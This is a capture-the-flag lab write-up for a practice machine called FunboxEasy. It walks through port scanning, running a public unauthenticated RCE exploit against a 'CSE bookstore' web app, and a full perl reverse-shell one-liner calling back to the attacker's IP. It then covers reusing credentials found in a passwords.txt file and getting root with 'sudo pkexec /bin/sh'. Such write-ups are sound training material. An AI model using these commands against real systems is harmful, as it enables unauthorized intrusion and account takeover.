# FunboxEasy

## Nmap

```
nmap 192.168.178.111 -p- -sS -sV

Host is up (0.097s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
```

Checking out port 80 we have the default install page for Apache 2.

![](<../../../.gitbook/assets/image (1575).png>)

Checking the source on this page reveals no interesting information. From here I executed dirsearch.py against the target machine.

```
sudo python3 dirsearch.py -u http://192.168.178.111/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --full-url -t 75 
```

![](<../../../.gitbook/assets/image (1576).png>)

Checking the directory /store we are presented a web page for 'CSE bookstore'.

![/store](<../../../.gitbook/assets/image (1578) (1).png>)

Researching exploits on Google for 'CSE bookstore' we are presented with an exploit for Unauthenticated RCE. The exploit PoC has been linked below.

{% embed url="https://www.exploit-db.com/exploits/47887" %}

After downloading the PoC I executed it with the following command:

```
python3 47887.py http://192.168.178.111/store/
```

When prompted to launch a shell hit 'y'.

![](<../../../.gitbook/assets/image (1579).png>)

This shell stops us from properly navigating the target machine and will return us back to the current working directory when the command has finished executing. As such I checked what binary's are installed on the target machine so we can spawn a shell where we can navigate the target properly.

![](<../../../.gitbook/assets/image (1580).png>)

As per above `perl` is installed on the system. From here I started a `netcat` listener on my attacking machine.

```
sudo nc -lvp 80
```

![](<../../../.gitbook/assets/image (1581).png>)

I then executed the following command to gain a `perl` reverse shell.

```
perl -e 'use Socket;$i="192.168.49.178";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

![](<../../../.gitbook/assets/image (1582).png>)

Moving into the home directory and then into the user tony's home directory we have passwords.txt. Reading the contents of this text file shows the following information:

![](<../../../.gitbook/assets/image (1583).png>)

```
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

I then able to login with the `SSH` password for the user tony.

![](<../../../.gitbook/assets/image (1584).png>)

Checking `sudo -l` for `sudo` permissions we come into a multitude of entries.

![](<../../../.gitbook/assets/image (1585).png>)

As we can execute `sudo` as the user root without supplying a password here I will use `pkexec` to spawn a bash shell as root.

```
sudo pkexec /bin/sh
```

![](<../../../.gitbook/assets/image (1586).png>)
